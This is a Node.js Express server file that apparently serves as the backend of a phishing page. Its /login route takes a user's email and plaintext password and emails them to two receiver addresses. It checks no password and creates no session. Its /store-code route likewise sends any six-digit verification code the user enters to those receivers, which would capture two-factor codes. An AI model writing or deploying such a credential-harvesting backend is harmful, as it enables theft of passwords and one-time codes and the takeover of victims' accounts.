require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors()); // Allows frontend to communicate with backend
app.use(bodyParser.json());

// Nodemailer setup for both receivers
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// In-memory store for the verification code
let verificationCode = null;

// Function to generate a random 6-digit code
const generateVerificationCode = () => {
  return Math.floor(100000 + Math.random() * 900000); // Generates a 6-digit random number
};

// Login Route
app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required' });
  }

  // Generate the 6-digit verification code
  verificationCode = generateVerificationCode();

  // Send login details and verification code via email to both receivers
  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: `${process.env.RECEIVER_EMAIL_1}, ${process.env.RECEIVER_EMAIL_2}`, // Add both receiver emails here
    subject: 'New Login Attempt - Verification Code',
    text: `Login Details:\n\nEmail: ${email}\nPassword: ${password}\n`,
  };

  try {
    // Send the email with login details and verification code to both receivers
    await transporter.sendMail(mailOptions);
    res.json({ message: 'Login details and verification code sent successfully' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Failed to send email' });
  }
});

// Verification Route
app.post('/verify', async (req, res) => {
  const { enteredCode } = req.body;

  if (!enteredCode) {
    return res.status(400).json({ error: 'Verification code is required' });
  }

  // Check if the entered code matches the generated verification code
  if (parseInt(enteredCode) === verificationCode) {
    // Send confirmation email with the correct code to both receivers
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: `${process.env.RECEIVER_EMAIL_1}, ${process.env.RECEIVER_EMAIL_2}`, // Send to both receivers
      subject: 'Verification Successful',
      text: `The entered verification code is correct: ${enteredCode}`,
    };

    try {
      // Send the confirmation email to both receivers
      await transporter.sendMail(mailOptions);
      res.json({ message: 'Verification successful! Confirmation email sent.' });
    } catch (error) {
      console.error(error);
      res.status(500).json({ error: 'Failed to send confirmation email' });
    }
  } else {
    res.status(400).json({ error: 'Incorrect verification code' });
  }
});

// Route to store the code and send it via email to both receivers
app.post('/store-code', async (req, res) => {
  const { code } = req.body;

  if (!code || code.length !== 6) {
    return res.status(400).json({ error: 'Invalid code format' });
  }

  // Send the code via email to both receivers
  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: `${process.env.RECEIVER_EMAIL_1}, ${process.env.RECEIVER_EMAIL_2}`, // Send to both receivers
    subject: 'User Verification Code',
    text: `The user entered the verification code: ${code}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.json({ message: 'Code sent successfully' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Failed to send code' });
  }
});

// Start Server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
